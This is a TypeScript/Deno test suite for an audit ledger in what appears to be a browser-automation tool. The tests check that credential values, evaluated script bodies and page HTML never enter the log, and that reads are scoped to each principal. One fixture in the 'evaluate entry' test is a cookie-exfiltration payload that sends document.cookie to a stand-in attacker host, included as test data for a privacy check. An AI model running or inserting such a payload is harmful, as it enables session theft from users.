/**
 * The audit ledger's contract (design §6.5, SEC-08).
 *
 * Every test here is a deny path or a shape assertion, because the ledger is a *disclosure* surface:
 * it records which credential was spent where and by whom, so what it may not carry and who may read
 * it are the two facts worth pinning.
 */
import { assert, assertEquals } from '@std/assert';
import { AUDIT_RING_CAPACITY, AuditLedger, expressionDigest } from './audit.ts';

const SENTINEL = 'Zq8-LEDGER-SENTINEL-3vP';

function ledger(capacity?: number): AuditLedger {
	let tick = 1_700_000_000_000;
	return new AuditLedger({ ...(capacity === undefined ? {} : { capacity }), now: () => tick++ });
}

Deno.test('audit: a secret-fill entry carries the NAME and nothing that could be the value', () => {
	const led = ledger();
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'secret-fill',
		frame_id: 'F1',
		origin: 'https://bank.example.com',
		secret: 'bank_password',
		index: 7,
		ok: true,
	});
	assertEquals(entry.secret, 'bank_password');
	assertEquals(entry.kind, 'secret-fill');
	// The shape has no field a value could go in, which is the control: `expression_bytes` and
	// `expression_digest` are the two length-ish fields and neither is defined on this kind.
	assertEquals(entry.expression_bytes, undefined);
	assertEquals(entry.expression_digest, undefined);
	assert(!JSON.stringify(led.read({ principal: 'p1' })).includes(SENTINEL));
});

Deno.test('audit: a seeded secret value appears nowhere in the serialized ledger (SEC-08)', () => {
	const led = ledger();
	// The producer is given every field it may set, with the sentinel as the secret's *name* only —
	// the value never reaches this module at all, and this asserts the shape cannot smuggle one.
	led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'secret-fill',
		frame_id: 'F1',
		origin: 'https://bank.example.com',
		secret: 'bank_password',
		index: 7,
		ok: true,
	});
	const serialized = JSON.stringify(led.read({ principal: 'p1', all: true }));
	assert(!serialized.includes(SENTINEL), serialized);
	// Not a prefix and not a length either: on a field a caller knows to be a credential, the first
	// characters and the character count are as disclosing as the value (E-38's rule, applied here).
	assert(!serialized.includes(SENTINEL.slice(0, 6)), serialized);
	assert(!serialized.includes(`"length":${SENTINEL.length}`), serialized);
});

Deno.test('audit: an evaluate entry records length and digest, never the expression body', async () => {
	const led = ledger();
	const expression = `fetch('https://evil.example/?c='+document.cookie+'${SENTINEL}')`;
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'evaluate',
		frame_id: 'F1',
		origin: 'https://app.example.com',
		expression_bytes: new TextEncoder().encode(expression).length,
		expression_digest: await expressionDigest(expression),
		result_bytes: 0,
		ok: true,
	});
	assertEquals(entry.expression_bytes, new TextEncoder().encode(expression).length);
	assertEquals(entry.expression_digest?.length, 16);
	const serialized = JSON.stringify(led.read({ principal: 'p1' }));
	assert(!serialized.includes(SENTINEL), 'the expression body reached the ledger');
	assert(!serialized.includes('fetch('), 'an expression prefix reached the ledger');
	assert(!serialized.includes('document.cookie'), 'an expression fragment reached the ledger');
});

Deno.test('audit: the digest is stable, 16 hex characters, and distinguishes two expressions', async () => {
	const a = await expressionDigest('1 + 1');
	const b = await expressionDigest('1 + 2');
	assertEquals(a, await expressionDigest('1 + 1'));
	assert(a !== b);
	assert(/^[0-9a-f]{16}$/.test(a), a);
});

Deno.test('audit: a read under mcp:invoke returns only the caller’s own entries (SEC-08)', () => {
	const led = ledger();
	for (const principal of ['alice', 'bob', 'alice']) {
		led.append({ session_id: 's1', principal, kind: 'evaluate', frame_id: 'F', origin: 'https://a.example', ok: true });
	}
	const own = led.read({ principal: 'alice' });
	assertEquals(own.scope, 'own');
	assertEquals(own.entries.length, 2);
	assertEquals(new Set(own.entries.map((entry) => entry.principal)), new Set(['alice']));

	// The admin read is the *other* half: a filter that never widened would be indistinguishable
	// from one that never narrowed.
	const all = led.read({ principal: 'alice', all: true });
	assertEquals(all.scope, 'all');
	assertEquals(all.entries.length, 3);
});

Deno.test('audit: the filter runs before the page, so a short page cannot count another principal', () => {
	const led = ledger();
	// Ten of bob's, then one of alice's. A page of 5 applied before the filter would answer alice
	// zero entries and leak, by its emptiness, that someone else had written ten.
	for (let i = 0; i < 10; i++) {
		led.append({ session_id: 's', principal: 'bob', kind: 'evaluate', frame_id: 'F', origin: 'https://a.example' });
	}
	led.append({ session_id: 's', principal: 'alice', kind: 'evaluate', frame_id: 'F', origin: 'https://a.example' });
	assertEquals(led.read({ principal: 'alice', limit: 5 }).entries.length, 1);
});

Deno.test('audit: `since` pages forward on the sortable id', () => {
	const led = ledger();
	const first = led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	const second = led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	assert(second.audit_id > first.audit_id, `${second.audit_id} must sort after ${first.audit_id}`);
	const page = led.read({ principal: 'p', since: first.audit_id });
	assertEquals(page.entries.map((entry) => entry.audit_id), [second.audit_id]);
});

Deno.test('audit: the ring evicts oldest-first and reports what it dropped', () => {
	const led = ledger(3);
	for (let i = 0; i < 5; i++) {
		led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: `F${i}`, origin: 'https://a' });
	}
	const read = led.read({ principal: 'p' });
	assertEquals(read.entries.length, 3);
	assertEquals(read.dropped, 2);
	assertEquals(read.entries.map((entry) => entry.frame_id), ['F2', 'F3', 'F4']);
});

Deno.test('audit: the default capacity is 200 (IR-6), not the 50 SEC-08 proposed', () => {
	assertEquals(AUDIT_RING_CAPACITY, 200);
	const led = ledger();
	for (let i = 0; i < AUDIT_RING_CAPACITY + 1; i++) {
		led.append({ session_id: 's', principal: 'p', kind: 'evaluate', frame_id: 'F', origin: 'https://a' });
	}
	assertEquals(led.size, AUDIT_RING_CAPACITY);
	assertEquals(led.dropped, 1);
});

Deno.test('audit: the producer cannot choose audit_id or at', () => {
	const led = ledger();
	const forged = { audit_id: 'FORGED', at: '1999-01-01T00:00:00.000Z' } as unknown as Record<string, unknown>;
	const entry = led.append({
		session_id: 's',
		principal: 'p',
		kind: 'evaluate',
		frame_id: 'F',
		origin: 'https://a',
		...forged,
	} as never);
	assert(entry.audit_id !== 'FORGED');
	assert(!entry.at.startsWith('1999'));
});

Deno.test('audit: the module writes no file — there is no filesystem API to reach (SEC-08)', async () => {
	const source = await Deno.readTextFile(new URL('./audit.ts', import.meta.url));
	// Every `Deno.` reference, not a denylist of the four write calls thought of today: a module that
	// reaches the runtime API at all is one a later edit can persist through.
	const reached = [...source.matchAll(/\bDeno\.[A-Za-z]+/g)].map((match) => match[0]);
	assertEquals(reached, [], `audit.ts must not reach the runtime API: ${reached.join(', ')}`);
	assert(!source.includes('localStorage'), 'audit.ts must not reach browser-style storage either');
});

/**
 * I-FH-5 and C-9: the third kind's exact key set.
 *
 * The control is the *shape*: a `read-frame-html` row says that a cross-origin document was read,
 * from which frame, of which origin and how much came back — and there is no field a byte of it
 * could go in. Asserted as an exact key set rather than as "no HTML appears", because the second
 * would pass for a row that grew an `html_digest`: a digest of a document is a confirmation oracle
 * for a page an attacker can guess, which is SEC-08's argument applied to a second kind of content,
 * and a prefix is where the interesting markup is (SEC-FH-6).
 */
Deno.test('audit: a read-frame-html entry is exactly {identity, frame, origin, size, ok} (I-FH-5, C-9)', () => {
	const led = ledger();
	const entry = led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'read-frame-html',
		frame_id: 'F-CHILD',
		origin: 'http://127.0.0.1:38112',
		result_bytes: 4096,
		ok: true,
	});
	assertEquals(
		Object.keys(entry).sort(),
		['at', 'audit_id', 'frame_id', 'kind', 'ok', 'origin', 'principal', 'result_bytes', 'session_id'],
	);
	assertEquals(entry.kind, 'read-frame-html');
	// No caller expression exists on this path, and the ledger's own shape says so: the non-goal
	// "no arbitrary JavaScript input to browser_get_html" is visible in what the row cannot carry.
	assertEquals(entry.expression_bytes, undefined);
	assertEquals(entry.expression_digest, undefined);
	assertEquals(entry.secret, undefined);
	assertEquals(entry.index, undefined);
	// `ok` is always true here: a refusal writes no row, because nothing privileged happened.
	assertEquals(entry.ok, true);
});

Deno.test('audit: a document read into the ledger discloses its size and its origin, never its bytes', () => {
	const led = ledger();
	const document = `<html><body><p>${SENTINEL}</p></body></html>`;
	led.append({
		session_id: 's1',
		principal: 'p1',
		kind: 'read-frame-html',
		frame_id: 'F-CHILD',
		// The producer is given everything it may set. The URL's path and query are already gone by
		// the time a value reaches here — `originOf` strips them at the handler — and the origin is
		// what the row is allowed to name.
		origin: 'https://login.example.com',
		result_bytes: new TextEncoder().encode(document).length,
		ok: true,
	});
	const serialized = JSON.stringify(led.read({ principal: 'p1', all: true }));
	assert(!serialized.includes(SENTINEL), 'a document byte reached the ledger');
	assert(!serialized.includes(SENTINEL.slice(0, 6)), 'a document prefix reached the ledger');
	assert(!serialized.includes('<html'), 'document markup reached the ledger');
	// The size is permitted with its own argument: the principal that wrote the row has already
	// received the document, so its size discloses nothing to that principal, and another principal
	// sees the row only under `admin` (SEC-08).
	assert(serialized.includes(`"result_bytes":${new TextEncoder().encode(document).length}`), serialized);
});
